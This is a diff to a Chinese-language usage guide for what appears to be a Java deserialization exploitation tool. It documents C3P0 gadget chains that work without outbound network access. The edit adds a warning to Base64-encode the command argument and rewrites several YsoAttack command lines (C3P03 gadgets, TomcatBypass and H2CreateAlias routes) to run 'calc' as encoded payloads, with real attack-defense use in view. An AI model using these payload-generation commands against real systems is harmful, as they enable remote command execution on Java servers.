@@ -622,16 +622,18 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 
 描述：C3P0利用链可以不出网利用，关于利用链的构造可以学习yulegeyu师傅的[JAVA反序列化之C3P0不出网利用](https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)文章。所以做漏洞利用的时候可引用JNDIAttack模块的Reference本地工厂类。而因为JNDIAttack模块有些Refernce工厂类漏洞利用又是出网的(如:Snakeyaml)，所以实际攻防时还需要注意构造合适的args参数
 
-工具：使用方式如下：参数直接写Reference打法的路由
+工具：使用方式如下：参数直接写Reference打法的路由。注意Refernce的最后路径利用参数需要Base64编码，否则生成Payload会有问题。
 
 ```python
 # com.mchange:c3p0
 -m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/calc"
--m YsoAttack -g C3P03 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/calc"
+-m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
+-m YsoAttack -g C3P03 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
 
 # c3p0:c3p0
 -m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/calc"
--m YsoAttack -g C3P03_c3p0 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/calc"
+-m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
+-m YsoAttack -g C3P03_c3p0 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
 ```
 
 ####  SpringAOP(JDK高版本)
